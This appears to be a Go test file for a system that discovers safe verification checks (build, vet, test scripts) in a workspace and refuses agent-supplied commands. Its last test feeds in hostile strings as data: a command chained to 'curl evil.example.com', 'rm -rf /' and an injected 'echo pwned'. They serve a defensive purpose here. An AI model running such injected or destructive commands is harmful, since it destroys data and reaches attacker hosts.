package claims

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func names(c *Catalogue) string { return strings.Join(c.Names(), " ") }

// A Go project needs no configuration at all.
func TestDiscoverFindsGoChecks(t *testing.T) {
	ws := t.TempDir()
	writeFile(t, filepath.Join(ws, "go.mod"), "module example.com/x\n")

	got := names(Discover(ws))
	for _, want := range []string{"go-build", "go-vet", "go-test"} {
		if !strings.Contains(got, want) {
			t.Errorf("discovered %q, missing %s", got, want)
		}
	}
}

// Scripts that answer "is the code correct" are offered; the rest are not.
// A claim naming "deploy" would otherwise have the host deploy something.
func TestDiscoverOffersOnlySafeScripts(t *testing.T) {
	ws := t.TempDir()
	pkg := map[string]any{"scripts": map[string]string{
		"test": "vitest", "check": "svelte-check", "build": "vite build",
		"deploy": "./deploy.sh", "publish": "npm publish", "dev": "vite",
	}}
	data, _ := json.Marshal(pkg)
	writeFile(t, filepath.Join(ws, "package.json"), string(data))

	got := names(Discover(ws))
	for _, want := range []string{"npm-test", "npm-check", "npm-build"} {
		if !strings.Contains(got, want) {
			t.Errorf("discovered %q, missing %s", got, want)
		}
	}
	for _, forbidden := range []string{"deploy", "publish", "dev"} {
		if strings.Contains(got, forbidden) {
			t.Fatalf("discovered %q, which offers %s — a claim could make the host run it", got, forbidden)
		}
	}
}

// The common layout here: Go at the root, node under frontend/.
func TestDiscoverHandlesAFrontendSubdirectory(t *testing.T) {
	ws := t.TempDir()
	writeFile(t, filepath.Join(ws, "go.mod"), "module example.com/x\n")
	writeFile(t, filepath.Join(ws, "frontend", "package.json"),
		`{"scripts":{"check":"svelte-check","build":"vite build"}}`)

	cat := Discover(ws)
	check, ok := cat.Lookup("npm-frontend-check")
	if !ok {
		t.Fatalf("discovered %q, missing the frontend check", names(cat))
	}
	joined := strings.Join(check.Command, " ")
	if !strings.Contains(joined, "--prefix frontend") {
		t.Fatalf("frontend check runs %q, which would run in the wrong directory", joined)
	}
}

// A workspace with nothing recognisable yields nothing, which leaves every claim
// an opinion — the safe direction.
func TestDiscoverFindsNothingInAnEmptyWorkspace(t *testing.T) {
	if got := Discover(t.TempDir()); len(got.Checks) != 0 {
		t.Fatalf("empty workspace produced %v", got.Names())
	}
}

// The explicit file is now optional, and adds to what was discovered.
func TestCatalogueForMergesExplicitOverDiscovered(t *testing.T) {
	ws := t.TempDir()
	writeFile(t, filepath.Join(ws, "go.mod"), "module example.com/x\n")
	writeFile(t, filepath.Join(ws, ".claude-suite", "checks.json"), `{"checks":[
		{"name":"go-test","description":"only the slow ones","command":["go","test","./backend/...","-run","Slow"],"timeout_sec":900},
		{"name":"custom-e2e","description":"bespoke","command":["./scripts/e2e.sh"],"timeout_sec":600}
	]}`)

	cat, err := CatalogueFor(ws)
	if err != nil {
		t.Fatal(err)
	}

	// Discovered entries survive.
	if _, ok := cat.Lookup("go-build"); !ok {
		t.Errorf("merging dropped a discovered check: %v", cat.Names())
	}
	// A declared entry wins on name collision.
	overridden, ok := cat.Lookup("go-test")
	if !ok {
		t.Fatal("go-test disappeared")
	}
	if overridden.Description != "only the slow ones" {
		t.Errorf("explicit go-test did not override the discovered one: %q", overridden.Description)
	}
	// And a wholly new one is added.
	if _, ok := cat.Lookup("custom-e2e"); !ok {
		t.Errorf("merging dropped the declared check: %v", cat.Names())
	}
}

// No file, no problem: this is the whole point of discovery.
func TestCatalogueForWorksWithNoFile(t *testing.T) {
	ws := t.TempDir()
	writeFile(t, filepath.Join(ws, "go.mod"), "module example.com/x\n")

	cat, err := CatalogueFor(ws)
	if err != nil {
		t.Fatal(err)
	}
	if len(cat.Checks) == 0 {
		t.Fatal("a Go project with no checks.json produced an empty catalogue")
	}
}

// Discovery must not weaken the rule that matters.
func TestDiscoveredCatalogueStillRejectsAgentSuppliedCommands(t *testing.T) {
	ws := t.TempDir()
	writeFile(t, filepath.Join(ws, "go.mod"), "module example.com/x\n")

	cat, err := CatalogueFor(ws)
	if err != nil {
		t.Fatal(err)
	}
	r := &Runner{Workspace: ws, Catalogue: cat}

	for _, attempt := range []string{"go test ./... ; curl evil.example.com", "rm -rf /", "go-test; echo pwned"} {
		c := &Claim{ID: "c", Author: "an", Subject: "x", Assertion: "a", Falsifier: attempt}
		c.Classify()
		if v, _, _ := r.Run(t.Context(), c); v != VerdictInconclusive {
			t.Fatalf("falsifier %q produced %s; only catalogue entries may run", attempt, v)
		}
	}
}
